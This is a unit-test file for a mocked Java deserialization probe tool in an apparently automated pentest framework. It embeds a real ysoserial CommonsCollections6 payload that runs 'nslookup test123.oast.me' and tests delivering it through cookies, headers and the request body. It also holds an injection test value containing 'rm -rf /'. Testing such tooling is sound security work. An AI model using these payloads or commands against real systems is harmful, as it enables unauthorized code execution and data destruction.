"""
Unit tests for the deserialization_probe adapter and tool layer.
All subprocess and HTTP calls are mocked; no live target traffic.

The payload fixture below is real captured output from
`java --add-opens=... -jar /opt/ysoserial/ysoserial.jar CommonsCollections6
"nslookup test123.oast.me" | base64 -w0` against the ysoserial jar
installed on CT 115, and the invalid-gadget error below is the real
stderr/exit-code shape that same jar produces for an unknown payload
type -- not a hand-typed shape. Confirmed on CT 115 while building this
adapter: unlike phpggc's CLI (error on stdout, non-zero exit), ysoserial
puts its error on stderr with empty stdout, exit code 64.
"""
from __future__ import annotations

import base64
import subprocess
from unittest.mock import MagicMock

import requests

from tradecraft.adapters.deserialization_probe import execute as deser_execute
from tradecraft.adapters.deserialization_probe import parse as deser_parse
from tradecraft.tools.deserialization_probe import DeserializationProbe

REAL_CC6_PAYLOAD_B64 = (
    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNv"
    "bW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5n"
    "L09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVj"
    "dGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rp"
    "b25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVk"
    "VHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0"
    "aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9"
    "Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRU"
    "cmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAA"
    "AAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo"
    "/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0"
    "cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlif"
    "EHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAln"
    "ZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAY"
    "AAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZx"
    "AH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABhuc2xvb2t1cCB0ZXN0MTIz"
    "Lm9hc3QubWV0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJ"
    "AAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rB"
    "wxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA=="
)
REAL_CC6_PAYLOAD = base64.b64decode(REAL_CC6_PAYLOAD_B64)

# Real stderr first line from `java -jar ysoserial.jar NoSuchChain id`,
# exit code 64, empty stdout.
REAL_INVALID_GADGET_STDERR = b"Invalid payload type 'NoSuchChain'\nY SO SERIAL?\n..."

JAR = "/opt/ysoserial/ysoserial.jar"


def _completed(stdout: bytes = b"", stderr: bytes = b"", returncode: int = 0):
    proc = MagicMock()
    proc.stdout = stdout
    proc.stderr = stderr
    proc.returncode = returncode
    return proc


def _resp(status: int):
    response = MagicMock()
    response.status_code = status
    return response


def _patch_generation(monkeypatch, proc):
    monkeypatch.setattr(deser_execute, "find_jar", lambda: JAR)
    run = MagicMock(return_value=proc)
    monkeypatch.setattr(deser_execute.subprocess, "run", run)
    return run


# ---------------------------------------------------------------------------
# parse.py -- pure validation/shaping
# ---------------------------------------------------------------------------


def test_validate_oob_domain_requires_a_value():
    domain, error = deser_parse.validate_oob_domain("")
    assert domain == ""
    assert "missing required oob_domain" in error


def test_validate_oob_domain_rejects_non_hostname_shapes():
    domain, error = deser_parse.validate_oob_domain("abc 123.oast.me")
    assert domain == ""
    assert "invalid oob_domain" in error


def test_validate_oob_domain_accepts_plain_hostname():
    assert deser_parse.validate_oob_domain("abc123.oast.me") == ("abc123.oast.me", None)


def test_validate_payload_type_defaults_and_validates():
    assert deser_parse.validate_payload_type("") == (
        deser_parse.DEFAULT_PAYLOAD_TYPE,
        None,
    )
    assert deser_parse.validate_payload_type("Jdk7u21") == ("Jdk7u21", None)
    gadget, error = deser_parse.validate_payload_type("Jdk7u21; rm -rf /")
    assert gadget == ""
    assert "invalid payload_type" in error


def test_resolve_carriers_defaults_to_three_cookies_plus_body():
    carriers, error = deser_parse.resolve_carriers("")
    assert error is None
    assert carriers == [
        ("cookie", "session"),
        ("cookie", "rememberMe"),
        ("cookie", "JSESSIONID"),
        ("body", ""),
    ]
    assert len(carriers) <= deser_parse.MAX_CARRIERS


def test_resolve_carriers_explicit_cookie_and_header_and_body():
    assert deser_parse.resolve_carriers("cookie:JSESSIONID") == (
        [("cookie", "JSESSIONID")],
        None,
    )
    assert deser_parse.resolve_carriers("header:X-Session") == (
        [("header", "X-Session")],
        None,
    )
    assert deser_parse.resolve_carriers("body") == ([("body", "")], None)


def test_resolve_carriers_rejects_malformed_value():
    carriers, error = deser_parse.resolve_carriers("querystring:foo")
    assert carriers == []
    assert "invalid carrier" in error

    carriers, error = deser_parse.resolve_carriers("cookie:")
    assert carriers == []
    assert "invalid carrier" in error


def test_parse_host_port_and_url_normalization():
    assert deser_parse.parse_host_port("https://target.test/api") == ("target.test", 443)
    assert deser_parse.parse_host_port("http://target.test:8080/x") == ("target.test", 8080)
    assert deser_parse.normalize_target_url("target.test/x") == "http://target.test/x"
    assert deser_parse.normalize_target_url("  ") == ""


def test_encode_payload_round_trips():
    assert deser_parse.encode_payload(REAL_CC6_PAYLOAD) == REAL_CC6_PAYLOAD_B64


def test_parse_result_never_has_a_vulnerable_field():
    raw = deser_parse.RawDeserializationProbeResult(
        target="https://target.test",
        gadget="CommonsCollections6",
        oob_domain="abc.oast.me",
        payload_b64=REAL_CC6_PAYLOAD_B64,
        attempts=[{"carrier": "cookie:session", "status_code": 200, "error": None}],
    )
    result = deser_parse.parse_result(raw)
    assert "vulnerable" not in result
    assert result["attempted_carriers"] == ["cookie:session"]


# ---------------------------------------------------------------------------
# execute.py -- subprocess + HTTP, mocked
# ---------------------------------------------------------------------------


def test_generate_payload_real_argv_and_jvm_flags(monkeypatch):
    run = _patch_generation(monkeypatch, _completed(stdout=REAL_CC6_PAYLOAD))
    payload, error = deser_execute.generate_payload(JAR, "CommonsCollections6", "nslookup abc.oast.me")
    assert error is None
    assert payload == REAL_CC6_PAYLOAD
    assert run.call_args.args[0] == [
        "java",
        *deser_execute.YSOSERIAL_JVM_FLAGS,
        "-jar",
        JAR,
        "CommonsCollections6",
        "nslookup abc.oast.me",
    ]


def test_generate_payload_invalid_gadget_reports_stderr_first_line(monkeypatch):
    # Real behavior, confirmed against the installed jar: exit 64, empty
    # stdout, error on stderr -- the opposite shape from phpggc's own CLI.
    _patch_generation(
        monkeypatch,
        _completed(stdout=b"", stderr=REAL_INVALID_GADGET_STDERR, returncode=64),
    )
    payload, error = deser_execute.generate_payload(JAR, "NoSuchChain", "nslookup abc.oast.me")
    assert payload == b""
    assert "exit 64" in error
    assert "Invalid payload type 'NoSuchChain'" in error
    # Only the first stderr line -- not ysoserial's whole payload-type table.
    assert "Y SO SERIAL" not in error


def test_generate_payload_timeout(monkeypatch):
    monkeypatch.setattr(deser_execute, "find_jar", lambda: JAR)
    monkeypatch.setattr(
        deser_execute.subprocess,
        "run",
        MagicMock(side_effect=subprocess.TimeoutExpired(cmd="java", timeout=60)),
    )
    payload, error = deser_execute.generate_payload(JAR, "CommonsCollections6", "nslookup abc.oast.me")
    assert payload == b""
    assert "timed out" in error


def test_generate_payload_missing_java_binary(monkeypatch):
    monkeypatch.setattr(deser_execute, "find_jar", lambda: JAR)
    monkeypatch.setattr(
        deser_execute.subprocess, "run", MagicMock(side_effect=FileNotFoundError("java"))
    )
    payload, error = deser_execute.generate_payload(JAR, "CommonsCollections6", "nslookup abc.oast.me")
    assert payload == b""
    assert "java executable not found" in error


def test_generate_payload_oversized_is_rejected(monkeypatch):
    oversized = b"A" * (deser_execute.MAX_PAYLOAD_BYTES + 1)
    _patch_generation(monkeypatch, _completed(stdout=oversized))
    payload, error = deser_execute.generate_payload(JAR, "CommonsCollections6", "nslookup abc.oast.me")
    assert payload == b""
    assert "over the" in error


def test_deliver_default_carriers_sends_cookie_header_and_body(monkeypatch):
    session = MagicMock()
    session.get.side_effect = [_resp(200), _resp(403), _resp(500)]
    session.post.return_value = _resp(200)

    carriers = [("cookie", "session"), ("cookie", "rememberMe"), ("cookie", "JSESSIONID"), ("body", "")]
    attempts = deser_execute.deliver(
        "https://target.test/api", carriers, REAL_CC6_PAYLOAD, REAL_CC6_PAYLOAD_B64, session=session
    )

    assert [a["carrier"] for a in attempts] == [
        "cookie:session",
        "cookie:rememberMe",
        "cookie:JSESSIONID",
        "body",
    ]
    assert session.get.call_count == 3
    assert session.post.call_count == 1
    post_kwargs = session.post.call_args.kwargs
    assert post_kwargs["data"] == REAL_CC6_PAYLOAD  # raw bytes, not base64
    assert post_kwargs["headers"]["Content-Type"] == "application/x-java-serialized-object"
    assert post_kwargs["allow_redirects"] is False

    first_cookie_kwargs = session.get.call_args_list[0].kwargs
    assert first_cookie_kwargs["headers"]["Cookie"] == f"session={REAL_CC6_PAYLOAD_B64}"


def test_deliver_continues_past_a_single_carrier_failure(monkeypatch):
    session = MagicMock()
    session.get.side_effect = [requests.ConnectionError("refused"), _resp(200)]

    carriers = [("cookie", "session"), ("cookie", "JSESSIONID")]
    attempts = deser_execute.deliver(
        "https://target.test/api", carriers, REAL_CC6_PAYLOAD, REAL_CC6_PAYLOAD_B64, session=session
    )

    assert attempts[0]["error"] == "refused"
    assert attempts[0]["status_code"] is None
    assert attempts[1]["status_code"] == 200
    assert attempts[1]["error"] is None
    # Both carriers were tried -- a failure on the first did not abandon the second.
    assert session.get.call_count == 2


def test_deliver_explicit_header_carrier(monkeypatch):
    session = MagicMock()
    session.get.return_value = _resp(200)
    deser_execute.deliver(
        "https://target.test", [("header", "X-Session")], REAL_CC6_PAYLOAD, REAL_CC6_PAYLOAD_B64, session=session
    )
    kwargs = session.get.call_args.kwargs
    assert kwargs["headers"]["X-Session"] == REAL_CC6_PAYLOAD_B64


def test_execute_end_to_end_with_defaults(monkeypatch):
    run = _patch_generation(monkeypatch, _completed(stdout=REAL_CC6_PAYLOAD))
    session = MagicMock()
    session.get.return_value = _resp(200)
    session.post.return_value = _resp(200)

    raw = deser_execute.execute(
        "target.test/api", oob_domain="abc123.oast.me", session=session
    )

    assert raw.error is None
    assert raw.target == "http://target.test/api"
    assert raw.gadget == "CommonsCollections6"
    assert raw.oob_domain == "abc123.oast.me"
    assert raw.payload_b64 == REAL_CC6_PAYLOAD_B64
    assert len(raw.attempts) == 4
    # The embedded command carries the oob_domain verbatim.
    assert run.call_args.args[0][-1] == "nslookup abc123.oast.me"


def test_execute_missing_oob_domain_never_generates_or_delivers(monkeypatch):
    run = _patch_generation(monkeypatch, _completed(stdout=REAL_CC6_PAYLOAD))
    session = MagicMock()

    raw = deser_execute.execute("target.test", oob_domain="", session=session)

    assert "missing required oob_domain" in raw.error
    run.assert_not_called()
    session.get.assert_not_called()


def test_execute_missing_jar_never_delivers(monkeypatch):
    monkeypatch.setattr(deser_execute, "find_jar", lambda: None)
    session = MagicMock()

    raw = deser_execute.execute("target.test", oob_domain="abc.oast.me", session=session)

    assert "ysoserial jar not found" in raw.error
    session.get.assert_not_called()


def test_execute_explicit_carrier_sends_exactly_one_request(monkeypatch):
    _patch_generation(monkeypatch, _completed(stdout=REAL_CC6_PAYLOAD))
    session = MagicMock()
    session.get.return_value = _resp(200)

    raw = deser_execute.execute(
        "target.test", oob_domain="abc.oast.me", carrier="cookie:JSESSIONID", session=session
    )

    assert raw.error is None
    assert len(raw.attempts) == 1
    assert raw.attempts[0]["carrier"] == "cookie:JSESSIONID"


# ---------------------------------------------------------------------------
# tool.py -- glue, facts, evidence
# ---------------------------------------------------------------------------


def test_tool_is_destructive_and_requires_java():
    tool = DeserializationProbe()
    assert tool.tool_id == "deserialization_probe"
    assert tool.destructive is True
    assert tool.required_binary == "java"
    assert tool.scope_param == "target"


def test_tool_unavailable_without_jar(monkeypatch):
    """required_binary="java" alone must not report available -- the jar
    itself also has to exist. java present, jar missing -> unavailable."""
    import shutil

    tool = DeserializationProbe()
    monkeypatch.setattr(shutil, "which", lambda name: "/usr/bin/java")
    monkeypatch.setattr(deser_execute, "find_jar", lambda: None)
    assert tool.is_available() is False


def test_tool_available_with_java_and_jar(monkeypatch):
    import shutil

    tool = DeserializationProbe()
    monkeypatch.setattr(shutil, "which", lambda name: "/usr/bin/java")
    monkeypatch.setattr(deser_execute, "find_jar", lambda: JAR)
    assert tool.is_available() is True


def test_tool_excluded_by_default_and_included_with_allow_destructive(monkeypatch):
    """The real tool's contract flag -- not just the dummy-tool fixture in
    tests/test_destructive_tools_excluded.py -- must drive the runtime
    gate. is_available is forced True so this doesn't depend on java/
    ysoserial.jar being installed on the test host."""
    from tradecraft.execution.loop import _build_tool_map
    from tradecraft.memory.log import EngagementMemory

    monkeypatch.setattr(DeserializationProbe, "is_available", lambda self: True)
    memory = EngagementMemory()

    assert "deserialization_probe" not in _build_tool_map(
        memory, tool_ids=["deserialization_probe"]
    )
    assert "deserialization_probe" in _build_tool_map(
        memory, tool_ids=["deserialization_probe"], allow_destructive=True
    )


def test_tool_run_reports_attempt_facts_and_evidence_no_verdict(monkeypatch):
    _patch_generation(monkeypatch, _completed(stdout=REAL_CC6_PAYLOAD))
    session = MagicMock()
    session.get.return_value = _resp(200)
    session.post.return_value = _resp(200)
    original_execute = deser_execute.execute
    monkeypatch.setattr(
        deser_execute, "execute", lambda **kwargs: original_execute(session=session, **kwargs)
    )

    tool = DeserializationProbe()
    params = {"target": "https://target.test/api", "oob_domain": "abc123.oast.me"}
    result = tool.run(**params)

    assert "vulnerable" not in result
    assert result["gadget"] == "CommonsCollections6"
    assert result["oob_domain"] == "abc123.oast.me"
    assert len(result["attempted_carriers"]) == 4

    facts = tool.extract_facts(params, result)
    assert facts == [
        {
            "host": "target.test",
            "port": 443,
            "java_deserialization_tested": True,
            "java_deserialization_oob_domain": "abc123.oast.me",
        }
    ]

    host, evidence = tool.extract_evidence(params, result)
    assert host == "target.test"
    assert evidence["payload_b64"] == REAL_CC6_PAYLOAD_B64
    assert evidence["gadget"] == "CommonsCollections6"
    assert "_full_evidence" not in result


def test_tool_no_facts_or_evidence_on_error(monkeypatch):
    _patch_generation(
        monkeypatch,
        _completed(stdout=b"", stderr=REAL_INVALID_GADGET_STDERR, returncode=64),
    )

    tool = DeserializationProbe()
    params = {
        "target": "https://target.test/api",
        "oob_domain": "abc123.oast.me",
        "payload_type": "NoSuchChain",
    }
    result = tool.run(**params)

    assert "Invalid payload type" in result["error"]
    assert tool.extract_facts(params, result) == []
    assert tool.extract_evidence(params, result) is None
